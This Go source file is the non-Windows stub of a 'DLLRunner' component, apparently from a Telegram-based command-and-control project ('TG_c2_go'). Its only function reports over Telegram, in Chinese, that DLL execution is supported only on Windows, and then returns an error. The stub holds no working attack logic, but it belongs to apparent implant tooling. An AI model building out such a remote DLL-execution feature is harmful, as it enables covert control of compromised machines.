//go:build !windows

package functions

import (
	"fmt"
	
	"TG_c2_go/telegram"
)

// DLLRunner DLL调用功能
type DLLRunner struct {
	client *telegram.TelegramClient
}

// NewDLLRunner 创建新的DLL运行器
func NewDLLRunner() *DLLRunner {
	return &DLLRunner{
		client: telegram.NewTelegramClient(),
	}
}

// RunDLL 运行指定DLL的指定函数 (非Windows平台不支持)
func (dr *DLLRunner) RunDLL(dllName, functionName string) error {
	msg := "DLL调用功能仅支持Windows系统"
	dr.client.SendMessage(msg)
	return fmt.Errorf(msg)
}
